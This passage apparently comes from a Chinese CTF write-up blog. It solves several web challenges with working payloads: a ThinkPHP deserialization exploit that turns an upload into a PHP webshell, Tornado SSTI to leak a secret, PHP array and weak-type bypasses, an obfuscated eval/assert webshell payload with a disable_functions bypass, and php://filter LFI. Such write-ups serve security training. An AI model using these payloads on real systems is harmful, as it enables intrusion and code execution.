<p><img src="/2021/09/02/qiang-wang-bei-2019-upload/image-20210912163619476.png" alt="image-20210912163619476"></p>
<p>这里看得到上传路径</p>
<p><img src="/2021/09/02/qiang-wang-bei-2019-upload/image-20210912224136135.png" alt="image-20210912224136135"></p>
<pre><code>../upload/2b886493dfd70d92c76d86da48cf887d/10fb15c77258a991b0028080a64fb42d.png</code></pre>
<h5 id="tp5-application-web-controller"><a href="#tp5-application-web-controller" class="headerlink" title="tp5\application\web\controller"></a>tp5\application\web\controller</h5><p><img src="/2021/09/02/qiang-wang-bei-2019-upload/image-20210912223129146.png" alt="image-20210912223129146"></p>
<h5 id="proflie-php"><a href="#proflie-php" class="headerlink" title="proflie.php"></a>proflie.php</h5><pre><code>TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjc4OiIuL3VwbG9hZC8yYjg4NjQ5M2RmZDcwZDkyYzc2ZDg2ZGE0OGNmODg3ZC8xMGZiMTVjNzcyNThhOTkxYjAwMjgwODBhNjRmYjQyZC5wbmciO3M6ODoiZmlsZW5hbWUiO3M6Nzg6Ii4vdXBsb2FkLzJiODg2NDkzZGZkNzBkOTJjNzZkODZkYTQ4Y2Y4ODdkLzEwZmIxNWM3NzI1OGE5OTFiMDAyODA4MGE2NGZiNDJkLnBocCI7czoxMToidXBsb2FkX21lbnUiO047czozOiJleHQiO3M6MzoicG5nIjtzOjM6ImltZyI7czoxMDoidXBsb2FkX2ltZyI7czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czozOiJpbWciO319czo4OiJyZWdpc3RlZCI7YjowO30%3D</code></pre>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class=" language-PHP"><code class="language-PHP"><?php

namespace app\web\controller;
error_reporting(0);
class Profile
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;


    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}

class Register
{
    public $checker;
    public $registed;

    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }

}

$profile = new Profile();
$profile->except = ['index' => 'img'];
$profile->img = "upload_img";
$profile->ext = "png";
$profile->filename_tmp = "./upload/2b886493dfd70d92c76d86da48cf887d/10fb15c77258a991b0028080a64fb42d.png";
$profile->filename = "./upload/2b886493dfd70d92c76d86da48cf887d/10fb15c77258a991b0028080a64fb42d.php";

$register = new Register();
$register->registed = false;
$register->checker = $profile;

echo urlencode(base64_encode(serialize($register)));</code></pre>
<p>然后蚁剑连接</p>
]]></content>
  </entry>
  <entry>
    <title>护网杯:2018-EasyTornado</title>
    <url>/2021/03/28/hu-wang-bei-2018-easytornado/</url>
    <content><![CDATA[<p>访问网站：</p>
<p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/111.200.241.24448236.png" alt="111.200.241.24448236"></p>
<h4 id="flag-txt"><a href="#flag-txt" class="headerlink" title="flag.txt"></a>flag.txt</h4><p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/flag.txt.png" alt="flag.txt"></p>
<h4 id="welcome-txt"><a href="#welcome-txt" class="headerlink" title="welcome.txt"></a>welcome.txt</h4><p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/welcome.txt.png" alt="welcome.txt"></p>
<p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。</p>
<h4 id="hints-txt"><a href="#hints-txt" class="headerlink" title="hints.txt"></a>hints.txt</h4><p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/hints.txt.png" alt="hints.txt"></p>
<p>filehash=md5(cookie_secret+md5(filename)) 现在filename=/fllllllllllllag，只需要知道cookie_secret的既能访问flag。</p>
<p>测试后发现还有一个error界面，格式为/error?msg=Error，怀疑存在服务端模板注入攻击 （SSTI）<br> 尝试/error?msg= 在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考Tornado官方文档</p>
<p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/errormsg=%3C!--swig%EF%BF%BC2--%3E.png" alt="errormsg="></p>
<p>通过查阅文档发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名</p>
<p>handler指向的处理当前这个页面的RequestHandler对象，  RequestHandler.settings指向self.application.settings，  因此handler.settings指向RequestHandler.application.settings。<br> 构造payload获取cookie_secret</p>
<pre><code>error?msg={{handler.settings}}</code></pre>
<p><img src="/2021/03/28/hu-wang-bei-2018-easytornado/cookie.png" alt="cookie"></p>
<p>利用这个脚本计算出filehash的值</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib

filename <span class="token operator">=</span> <span class="token string">'/fllllllllllllag'</span>
cookie_secret <span class="token operator">=</span><span class="token string">"789f66a0-648f-4006-a8e3-698a753015cf"</span>

<span class="token keyword">def</span> <span class="token function">getvalue</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>getvalue<span class="token punctuation">(</span>cookie_secret <span class="token operator">+</span> getvalue<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

merge<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>cookie_secret</p>
<pre><code>2e3ee5f8-f039-4130-b0c3-0a1d6ce7676c</code></pre>
<pre><code>728ec3dc0db938043d73b1028a911254</code></pre>
<pre><code>2e3ee5f8f0394130b0c30a1d6ce7676c</code></pre>
<pre><code>588a1b37df48f7f13e7febb5f4419049</code></pre>
<p>/fllllllllllllag</p>
<p>md5加密一次：</p>
<pre><code>3bf9f6cf685a6dd8defadabfb41a03a1</code></pre>
<p>拼接md5再加密一次</p>
<pre><code>file?filename=/fllllllllllllag&amp;filehash=8fae43e45895ca18bc7a29bb9c64b1d6</code></pre>
]]></content>
      <tags>
        <tag>tornado</tag>
      </tags>
  </entry>
  <entry>
    <title>数组绕过</title>
    <url>/2021/09/13/shu-zu-rao-guo/</url>
    <content><![CDATA[<h3 id="1、数组绕过MD5判断"><a href="#1、数组绕过MD5判断" class="headerlink" title="1、数组绕过MD5判断"></a>1、数组绕过MD5判断</h3><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">else</span>
<span class="token keyword">print</span> <span class="token string">'Wrong.'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p><img src="https://upload-images.jianshu.io/upload_images/6952387-f377013e6573e356.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/623" alt="img"></p>
<p>如果传入md5函数的参数为数组类型，则返回null，<code>null===null</code>，因此可以通过数组可以绕过 <code>===</code> md5判断</p>
<h3 id="2、数组绕过strcmp"><a href="#2、数组绕过strcmp" class="headerlink" title="2、数组绕过strcmp"></a>2、数组绕过strcmp</h3><pre class=" language-php"><code class="language-php"><span class="token variable">$pass</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$pass1</span><span class="token operator">=</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//被隐藏起来的密码</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span><span class="token variable">$pass1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string">"flag:nctf{*}"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string">"the pass is wrong!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string">"please input pass!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<blockquote>
<p>strcmp函数用于字符串的比较</p>
<pre><code>int strcmp ( string $str1 , string $str2 )</code></pre>
<p>返回值：如果 <code>str1</code> 小于 <code>str2</code> 返回 &lt; 0； 如果 <code>str1</code> 大于 <code>str2</code> 返回 &gt; 0；如果两者相等，返回 0。</p>
<ul>
<li>5.2 中是将两个参数先转换成string类型。</li>
<li>5.3.3 以后，当比较数组和字符串的时候，返回是0。</li>
<li>5.5 中如果参数不是string类型，直接return了</li>
</ul>
<p>存在以下情况</p>
</blockquote>
<pre class=" language-php"><code class="language-php"><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span> <span class="token operator">+</span> <span class="token constant">PHP</span> Warning

<span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">stdClass</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span> <span class="token operator">+</span> <span class="token constant">PHP</span> Warning

<span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span> <span class="token operator">+</span> <span class="token constant">PHP</span> Warning</code></pre>
<p>因此post提交pass[]=aa，通过数组绕过strcmp。</p>
<h3 id="3、数组绕过ereg"><a href="#3、数组绕过ereg" class="headerlink" title="3、数组绕过ereg"></a>3、数组绕过ereg</h3><pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string">"^[1-9]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span>
            <span class="token keyword">echo</span> <span class="token string">'必须输入数字才行'</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'nctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'#biubiubiu'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span>   
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            <span class="token keyword">echo</span> <span class="token string">'骚年，继续努力吧啊~'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p><strong>ereg函数的漏洞</strong> ：</p>
<ul>
<li>存在%00截断（已被preg_match替代）</li>
<li>输入参数为数组时返回值为null</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/6952387-98a1a60f7e3dc083.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/613" alt="img"></p>
<p>payload：</p>
<ul>
<li>?nctf=111%00%23biubiubiu</li>
<li>?nctf[]=aa</li>
</ul>
<h3 id="4、PHP的弱类型-数组绕过正则"><a href="#4、PHP的弱类型-数组绕过正则" class="headerlink" title="4、PHP的弱类型+数组绕过正则"></a>4、PHP的弱类型+数组绕过正则</h3><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$title</span> <span class="token punctuation">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'|\A[ _a-zA-Z0-9]+\z|is'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">write_cache</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">changedir</span><span class="token punctuation">(</span><span class="token constant">CACHE_DIR</span> <span class="token punctuation">.</span> <span class="token function">get_username</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"title or content error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"{$dir}{$title}.php"</span><span class="token punctuation">;</span>

    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<blockquote>
<p>preg_match()返回 <code>pattern</code> 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索<code>subject</code> 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p>
</blockquote>
<p>preg_match本身并没有什么问题，但是在正则匹配之前，<code>$title</code>和<code>$content</code>进行了字符串连接。得益于PHP的弱类型特性，数组会被强制转换成字符串，也就是<code>Array</code>，Array肯定是满足正则<code>\A[ _a-zA-Z0-9]+\z</code>的，所以不会被拦截。</p>
<p>file_put_contents函数可以处理数组，所以构造payload:<code>?title=s&amp;content[]=&lt;?php phpinfo();?&gt;</code></p>
<h4 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h4><p><a href="https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=writer_share&amp;utm_source=weibo">https://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=writer_share&amp;utm_source=weibo</a></p>
]]></content>
  </entry>
  <entry>
    <title>极客大挑战:2019-BuyFlag</title>
    <url>/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/</url>
    <content><![CDATA[<p><img src="/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614223645887.png" alt="image-20210614223645887"></p>
<p><img src="/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614223700776.png" alt="image-20210614223700776"></p>
<p>点击menu看到这个：</p>
<p><img src="/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614223729634.png" alt="image-20210614223729634"></p>
<p><img src="/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614224001121.png" alt="image-20210614224001121"></p>
<p>查看源码：</p>
<pre><code>    ~~~post money and password~~~
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if (is_numeric($password)) {
        echo "password can't be number&lt;/br&gt;";
    }elseif ($password == 404) {
        echo "Password Right!&lt;/br&gt;";
    }
}</code></pre>
<p>所以要post：money=100000000和password=404但是password不能为数字</p>
<p>应用到PHP弱类型：</p>
<pre><code>money=100000000&amp;password=404a</code></pre>
<p>长度超了</p>
<pre><code>money=1e10&amp;password=404a</code></pre>
<pre><code>money[]=100000000&amp;password=404a</code></pre>
<p><img src="/2021/06/13/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614232002000.png" alt="image-20210614232002000"></p>
]]></content>
      <tags>
        <tag>PHP弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战:2019-PHP</title>
    <url>/2021/06/11/ji-ke-da-tiao-zhan-2019-php/</url>
    <content><![CDATA[<p>dirsearch扫描下载<a href="http://www.zip/">www.zip</a></p>
<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><pre><code> &lt;?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?&gt;</code></pre>
<h3 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h3><pre><code>&lt;?php
include 'flag.php';
error_reporting(0);
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    }

    function __wakeup(){
        $this-&gt;username = 'guest';
    }

    function __destruct(){
        if ($this-&gt;password != 100) {
            echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";
            echo "You name is: ";
            echo $this-&gt;username;echo "&lt;/br&gt;";
            echo "You password is: ";
            echo $this-&gt;password;echo "&lt;/br&gt;";
            die();
        }
        if ($this-&gt;username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";
            die();


        }
    }
}
?&gt;</code></pre>
<p>用户名为admin，密码为100则可以输出flag</p>
<pre><code>&lt;?php
class Name
{
    private $username = 'admin';
    private $password = '100';
}
$a = new Name();
echo serialize($a);
?&gt;</code></pre>
<p>结果：</p>
<pre><code>O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}</code></pre>
<h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><pre><code>?select=O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}</code></pre>
<p>然后就会扑街</p>
<p><img src="/2021/06/11/ji-ke-da-tiao-zhan-2019-php/1.png" alt="1"></p>
<p><strong>因为是private声明，我们需要在类名和字段名前面都会加上\0的前缀，看别人的wp了解在url栏中会出现\0有空白符，复制的时候会丢失，所以加上%00</strong></p>
<pre><code>?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}</code></pre>
<p><img src="/2021/06/11/ji-ke-da-tiao-zhan-2019-php/2.png" alt="2"></p>
]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战:2019-RCEMe</title>
    <url>/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>取反读取phpinfo</p>
<pre><code>&lt;?php
$s = 'phpinfo';
echo urlencode(~$s);
#%8F%97%8F%96%91%99%90
?&gt;</code></pre>
<p>payload</p>
<pre><code>?code=(~%8F%97%8F%96%91%99%90)();</code></pre>
<p>查看到disable_functions禁用的函数：</p>
<p><img src="/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/image-20210721211242855.png" alt="1"></p>
<pre><code>pcntl_alarm,
pcntl_fork,
pcntl_waitpid,
pcntl_wait,
pcntl_wifexited,
pcntl_wifstopped,
pcntl_wifsignaled,
pcntl_wifcontinued,
pcntl_wexitstatus,
pcntl_wtermsig,
pcntl_wstopsig,
pcntl_signal,
pcntl_signal_get_handler,
pcntl_signal_dispatch,
pcntl_get_last_error,
pcntl_strerror,
pcntl_sigprocmask,
pcntl_sigwaitinfo,
pcntl_sigtimedwait,
pcntl_exec,
pcntl_getpriority,
pcntl_setpriority,
pcntl_async_signals,
system,
exec,
shell_exec,
popen,proc_open,
passthru,
symlink,
link,
syslog,
imap_open,ld,dl</code></pre>
<p>构造取反连接蚁剑：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'assert'</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token string">'(eval($_POST[1]))'</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
 <span class="token delimiter">?></span></code></pre>
<pre><code>%9E%8C%8C%9A%8D%8B
%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6</code></pre>
<pre><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);</code></pre>
<p><img src="/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/image-20210721213053074.png" alt="2"></p>
<p>蚁剑连接：</p>
<p><img src="/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/image-20210721223025932.png" alt="3"></p>
<p>发现根目录下有flag和readflag</p>
<p>应该是通过执行readflag来读取flag，但是这里的shell命令基本上都被禁了</p>
<p>我们可以通过蚁剑的绕过disable_functions来执行</p>
<p><img src="/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/image-20210721222846905.png" alt="4"></p>
<p>下载绕过disable_functions插件开启</p>
<p>PHP7_GC_UAF模式</p>
<p>然后执行readflag</p>
<p><img src="/2021/07/21/ji-ke-da-tiao-zhan-2019-rceme/image-20210721223009841.png" alt="5"></p>
]]></content>
  </entry>
  <entry>
    <title>极客大挑战:2019-SecretFile</title>
    <url>/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/</url>
    <content><![CDATA[<p>F12</p>
<p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211655223.png" alt="image-20210609211655223"></p>
<pre><code>Archive_room.php</code></pre>
<p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211736485.png" alt="image-20210609211736485"></p>
<p>点中间就会</p>
<p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211800847.png" alt="image-20210609211800847"></p>
<p>burp抓包</p>
<p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211856185.png" alt="image-20210609211856185"></p>
<p>访问这个secret</p>
<pre><code>&lt;html&gt;
    &lt;title&gt;secret&lt;/title&gt;
    &lt;meta charset="UTF-8"&gt;
&lt;?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?&gt;
&lt;/html&gt;</code></pre>
<p>代码审计不能含有”../“，”tp”，”input”，”data”</p>
<p>所以才有LFI中的base64 encoded构造payload：</p>
<pre><code>secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre>
